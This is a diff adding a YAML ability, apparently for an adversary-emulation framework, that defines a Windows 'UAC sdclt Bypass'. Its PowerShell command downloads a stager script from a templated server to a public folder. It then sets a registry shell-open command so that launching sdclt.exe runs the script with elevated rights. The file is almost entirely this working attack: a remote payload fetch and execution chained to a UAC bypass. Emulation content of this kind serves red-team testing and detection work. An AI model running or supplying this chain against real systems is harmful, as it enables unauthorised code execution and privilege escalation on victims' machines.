@@ -1,0 +1,24 @@
+---
+
+- id: b7cf75b2-1314-432a-8cbe-647233ff21f3
+  name: UAC sdclt Bypass
+  description: UAC Bypass using sdclt.exe 
+  tactic: defense-evasion
+  technique:
+    attack_id: T1108
+    name: Redundant Access
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="#{server}/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","stager.ps1");
+          $wc.Headers.add("defaultGroup","bypassed_u_bro");
+          $output = "C:\Users\Public\calc.ps1";
+          $wc.DownloadFile($url, $output);
+          reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c powershell.exe -c iex C:\Users\Public\calc.ps1" /f ;
+          sdclt.exe;
+
+        payload: stager.ps1
